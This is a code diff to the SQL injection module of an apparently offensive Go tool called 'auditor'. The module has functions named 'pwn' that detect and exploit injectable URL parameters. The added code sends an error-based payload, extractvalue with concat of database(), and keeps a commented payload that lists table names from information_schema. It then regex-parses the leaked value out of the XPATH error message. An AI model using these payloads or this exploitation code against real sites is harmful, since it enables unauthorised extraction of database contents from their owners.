@@ -9,6 +9,7 @@ import (
 	based "auditor/handlers/sql/base"
 	"auditor/payloads/intruder/detect"
 	"log"
+	"regexp"
 	"strings"
 	"sync"
 
@@ -62,17 +63,13 @@ func (s *Service) Init(c *context.Context, f *BaseForm) (interface{}, error) {
 	options = s.findPrevious(f)
 
 	method := validatePwnType()
-	log.Println("==================")
-	log.Println(validateByErrorBased())
-	log.Println(method)
-	log.Println("==================")
 
 	switch method {
 	case based.LengthValidation:
-		color.Green("LengthValidation Detection Method: YES")
+		log.Println("[+] Length Validation Detection Method: YES")
 		s.pwnLengthValidation(based.LengthValidation)
-	case based.ErrorSQLiBased:
-		color.Green("LengthValidation Detection Method: YES")
+	case based.UnionSQLiBased:
+		log.Println("[+] UnionV alidation Detection Method: YES")
 		// pwnErrorbased(based.ErrorSQLiBased)
 	}
 
@@ -122,15 +119,16 @@ func (s *Service) pwnLengthValidation(method based.SQLi) interface{} {
 	return nil
 }
 
+// time.Now().Format("2006-01-02")
 func (s *Service) UnionBased(c *context.Context, f *BaseForm) (interface{}, error) {
 	options = entities.URLOptions(f.URL, f.Param, f.Cookie)
+	// html := based.UnionBasedvalidate(options, "")
 	html := based.UnionBasedvalidate(options, "+and+extractvalue(1,concat(%27:%27,database()))")
+	// html := based.UnionBasedvalidate(options, "+and+extractvalue(1,concat(':',length((select+group_concat(table_name)+from+information_schema.tables+where+table_schema+=+database()))))")
 
-	// myErr := "XPATH syntax error: ':.*'\nWarning:"
-	// myInput := "XPATH syntax error: ':acuart'\nWarning:"
-
-	// r := regexp.MustCompile(myErr)
+	r := regexp.MustCompile(based.ErrXPathQueryFrom)
 	// titles := r.FindString(html)
+	titles := r.FindString(html)
 
-	return html, nil
+	return titles, nil
 }
